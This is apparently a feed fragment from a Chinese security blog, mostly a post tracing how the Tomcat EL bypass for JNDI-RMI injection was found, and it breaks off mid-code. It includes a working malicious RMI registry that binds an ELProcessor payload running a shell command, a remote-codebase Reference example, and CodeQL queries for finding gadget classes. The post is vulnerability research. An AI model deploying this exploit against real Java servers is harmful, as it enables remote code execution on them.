href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html">Confluence Security Advisory 2022-06-02</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;!-- 日拱一卒，功不唐捐。--&gt;

&lt;p&gt;发现半年没写文章了。。。&lt;/p&gt;
&lt;h2 id=&quot;0x01-环境搭建&quot;&gt;&lt;a href=&quot;#0x01-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;0x01 环境搭建&quot;&gt;&lt;/a&gt;0x01 环境搭建&lt;/h2&gt;&lt;p&gt;P🐮的Vulhub 有镜像了，不过调试接口没有开出来，这里稍微补充下。&lt;/p&gt;
&lt;p&gt;在vulhub/confluence/CVE2022-26134 目录下&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;新建Dockerfile&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight dockerfile&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;FROM&lt;/span&gt; vulhub/confluence:&lt;span class=&quot;number&quot;&gt;7.13&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;RUN&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sed &lt;span class=&quot;string&quot;&gt;&amp;quot;106 iCATALINA_OPTS=\&amp;quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 \$\&amp;#123;CATALINA_OPTS\&amp;#125;\&amp;quot;&amp;quot;&lt;/span&gt; -i /opt/atlassian/confluence/bin/setenv.sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;更新docker-compose.yml&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;build:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# image: vulhub/confluence:7.13.6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;ports:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;bullet&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;8090:8090&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;bullet&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;5005:5005&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Confluence" scheme="http://m0d9.me/tags/Confluence/"/>
    
    <category term="OGNL" scheme="http://m0d9.me/tags/OGNL/"/>
    
  </entry>
  
  <entry>
    <title>JNDI-RMI 注入的EL 绕过思路分析</title>
    <link href="http://m0d9.me/2021/12/17/JNDI-RMI-LDAP%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/12/17/JNDI-RMI-LDAP%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</id>
    <published>2021-12-17T06:11:00.000Z</published>
    <updated>2022-03-18T06:26:23.093Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/pasted-203.png" alt="upload successful"></p><p>上面的JNDI 注入的JDK 版本限制已经耳熟能详了，针对JNDI-RMI 的tomcat EL 绕过姿势也被经常提起，本文尝试回溯这一姿势的发现过程。</p><h2 id="JNDI-RMI-注入"><a href="#JNDI-RMI-注入" class="headerlink" title="JNDI-RMI 注入"></a>JNDI-RMI 注入</h2><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>必须了解两个重要的类</p><ul><li>com.sun.jndi.rmi.registry.RegistryContext： JNDI-RMI接口</li><li>java.rmi.registry.Registry： RMI 接口</li></ul><p>通常攻击场景下，Registry是作为RMI服务端，RegistryContext是作为攻击的client端，也就是vuln。</p><a id="more"></a><h2 id="低版本注入过程：RegistryContext-lookup"><a href="#低版本注入过程：RegistryContext-lookup" class="headerlink" title="低版本注入过程：RegistryContext#lookup"></a>低版本注入过程：RegistryContext#lookup</h2><p>都在RegistryContext#lookup 里面，常见的如 ctx.lookup(“rmi://xxx/Exploit”)，被攻击过程如下</p><ul><li>registry#lookup 获取远程恶意server 绑定的Remote 类</li><li>registry#decodeObject 调用该Remote类 的getObjectInstance 实例化该类</li></ul><p>com.sun.jndi.rmi.registry.RegistryContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> Registry registry;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           Remote var2;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">           &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">           &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">               <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">           <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br></pre></td></tr></table></figure><p>javax.naming.spi.NamingManager#getObjectInstance</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">        getObjectInstance(Object refInfo, Name name, Context nameCtx,</span><br><span class="line">                          Hashtable&lt;?,?&gt; environment)</span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        ObjectFactory factory;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use builder if installed</span></span><br><span class="line">        ObjectFactoryBuilder builder = getObjectFactoryBuilder();</span><br><span class="line">        <span class="keyword">if</span> (builder != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// builder must return non-null factory</span></span><br><span class="line">            factory = builder.createObjectFactory(refInfo, environment);</span><br><span class="line">            <span class="keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,</span><br><span class="line">                environment);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use reference if possible</span></span><br><span class="line">        Reference ref = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            ref = (Reference) refInfo;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object answer;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String f = ref.getFactoryClassName();</span><br><span class="line">            <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                     environment);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">                <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">                <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">                <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">                answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">                <span class="keyword">if</span> (answer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> answer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// try using any specified factories</span></span><br><span class="line">        answer =</span><br><span class="line">            createObjectFromFactories(refInfo, name, nameCtx, environment);</span><br><span class="line">        <span class="keyword">return</span> (answer != <span class="keyword">null</span>) ? answer : refInfo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>注意此处，如果是Reference 对象，则会getObjectFactoryFromReference - getObjectInstance 进行实例化，也就是原本的JNDI-RMI利用流程。</p><h3 id="高版本限制：RegistryContext-decodeObject"><a href="#高版本限制：RegistryContext-decodeObject" class="headerlink" title="高版本限制：RegistryContext#decodeObject"></a>高版本限制：RegistryContext#decodeObject</h3><blockquote><p>在JDK 6u132, JDK 7u122, JDK 8u113 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。如果需要开启 RMI Registry 或者 COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。</p></blockquote><p>实现trustURLCodebase 的逻辑在decodeObject 上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">...</span><br><span class="line">            <span class="keyword">if</span> (var8 != <span class="keyword">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="keyword">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        PrivilegedAction var0 = () -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> System.getProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        String var1 = (String)AccessController.doPrivileged(var0);</span><br><span class="line">        trustURLCodebase = <span class="string">&quot;true&quot;</span>.equalsIgnoreCase(var1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="TOMCAT-EL的绕过"><a href="#TOMCAT-EL的绕过" class="headerlink" title="TOMCAT EL的绕过"></a>TOMCAT EL的绕过</h3><p>都知道tomcat EL可以实现绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.logCalls&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span></span><br><span class="line">ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line"><span class="comment">// 强制将 &#x27;x&#x27; 属性的setter 从 &#x27;setX&#x27; 变为 &#x27;eval&#x27;, 详细逻辑见 BeanFactory.getObjectInstance 代码</span></span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line"><span class="comment">// 利用表达式执行命令</span></span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;open -a calculator&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br></pre></td></tr></table></figure><h2 id="思路逆向分析"><a href="#思路逆向分析" class="headerlink" title="思路逆向分析"></a>思路逆向分析</h2><p>知其然更要知其所以然，这种绕过方式但是如何发现的呢？</p><h3 id="ResourceRef-的定位"><a href="#ResourceRef-的定位" class="headerlink" title="ResourceRef 的定位"></a>ResourceRef 的定位</h3><p>从RegistryContext#decodeObject 限制逻辑中可以看到，java.naming.Reference 用不了，因为getFactoryClassLocation 过不了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(className);</span><br><span class="line">    classFactory = factory;</span><br><span class="line">    classFactoryLocation = factoryLocation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么，还有哪些类满足</p><ol><li>继承Reference</li><li>getFactoryClassLocation 可以为null</li></ol><p>尝试找继承Reference 的子类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class MyReference extends ClassOrInterface&#123;</span><br><span class="line">MyReference()&#123;</span><br><span class="line">this.getName()&#x3D;&quot;Reference&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">predicate isMyClass(Class m)&#123;</span><br><span class="line">m.getASupertype*() instanceof MyReference</span><br><span class="line">&#125;</span><br><span class="line">from Class c</span><br><span class="line">where isMyClass(c)</span><br><span class="line">select c</span><br></pre></td></tr></table></figure><p>结论是在tomcat-catalina 中找到了</p><ul><li><strong>org.apache.naming.ResourceRef</strong></li><li>org.apache.naming.LookupRef (可rmi转ldap，作用有限)</li><li>org.apache.naming.HandlerRef</li><li>org.apache.naming.EjbRef</li><li>org.apache.naming.ResourceLinkRef</li><li>org.apache.naming.ResourceEnvRef</li><li>org.apache.naming.ServiceRef</li></ul><p>以ResourceRef 为例</p><h3 id="ReferenceWrapper-的定位"><a href="#ReferenceWrapper-的定位" class="headerlink" title="ReferenceWrapper 的定位"></a>ReferenceWrapper 的定位</h3><p>ResourceRef 定位到了，但是不能直接bind, 因为java.rmi.registry.Registry 只能bind Remote类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">(String name, Remote obj)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span>;</span><br></pre></td></tr></table></figure><p>如果熟悉JNDI-RMI 低版本注入，应该记得这两种方式：</p><ul><li>直接bind Exploit</li><li><strong>通过ReferenceWrapper(reference) 实现bind 远程目标类</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#1. 直接绑定存在恶意代码块的类实例</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>, (Remote) <span class="keyword">new</span> Exploit());</span><br><span class="line"></span><br><span class="line">#2. reference</span><br><span class="line">Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://localhost:8000/&quot;</span>);</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>,referenceWrapper);</span><br></pre></td></tr></table></figure><p>但是ReferenceWrapper(ResourceRef) 可以吗？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ReferenceWrapper</span><span class="params">(Reference var1)</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.wrappee = var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ResourceRef 继承Reference，可以</p><h3 id="BeanFactory-的定位"><a href="#BeanFactory-的定位" class="headerlink" title="BeanFactory 的定位"></a>BeanFactory 的定位</h3><p>再回顾下javax.naming.spi.NamingManager#getObjectInstance 的过程</p><ol><li>ref = (Reference) refInfo;</li><li>String f = ref.getFactoryClassName();</li><li>factory = getObjectFactoryFromReference(ref, f);</li><li>return factory.getObjectInstance(ref, name, nameCtx,  environment);</li></ol><p>结合ResourceRef 的构造函数以及factory属性<br><code>public ResourceRef(String resourceClass, String description, String scope, String auth, boolean singleton, String factory, String factoryLocation) &#123;</code></p><p>那么问题就成了：寻找可利用的Factory，需要满足</p><ol><li>继承Factory</li><li>getObjectInstance 有可利用空间<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class MyFactory extends ClassOrInterface&#123;</span><br><span class="line">MyFactory()&#123;</span><br><span class="line">this.getName()&#x3D;&quot;ObjectFactory&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">predicate isMyClass( Class m)&#123;</span><br><span class="line">m.getASourceSupertype() instanceof MyFactory</span><br><span class="line">&#125;</span><br><span class="line">from Class c</span><br><span class="line">where isMyClass(c)</span><br><span class="line">select c</span><br></pre></td></tr></table></figure>找找tomcat下面符合的Factory：</li></ol><ul><li>org.apache.naming.factory.BeanFactory</li><li>org.apache.tomcat.dbcp.dbcp2.datasources.InstanceKeyDataSourceFactory</li><li>org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory</li><li>org.apache.tomcat.jdbc.pool.DataSourceFactory</li></ul><h4 id="org-apache-naming-factory-BeanFactory"><a href="#org-apache-naming-factory-BeanFactory" class="headerlink" title="org.apache.naming.factory.BeanFactory"></a>org.apache.naming.factory.BeanFactory</h4><p>利用要求总结：</p><ol><li>需要有无参构造函数</li><li>可以调用符合条件的方法，要求方法的参数为1个，类型为String</li><li>还可以调用set*方法，要求方法的参数为1个，类型为String</li><li>以上方法都要求public</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="function"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line"></span><br><span class="line">    Reference ref = (Reference) obj;</span><br><span class="line">    String beanClassName = ref.getClassName();</span><br><span class="line">    ClassLoader tcl = Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="comment">// 1. 反射获取类对象</span></span><br><span class="line">    <span class="keyword">if</span> (tcl != <span class="keyword">null</span>) &#123;</span><br><span class="line">        beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        beanClass = Class.forName(beanClassName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 初始化类实例</span></span><br><span class="line">    Object bean = beanClass.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 根据 Reference 的属性查找 setter 方法的别名</span></span><br><span class="line">    RefAddr ra = ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">    String value = (String)ra.getContent();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 循环解析别名并保存到字典中</span></span><br><span class="line">    <span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">        param = param.trim();</span><br><span class="line">        index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">            param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setterName = <span class="string">&quot;set&quot;</span> +</span><br><span class="line">                param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +</span><br><span class="line">                param.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        forced.put(param, beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 解析所有属性，并根据别名去调用 setter 方法</span></span><br><span class="line">    Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line">    <span class="keyword">while</span> (e.hasMoreElements()) 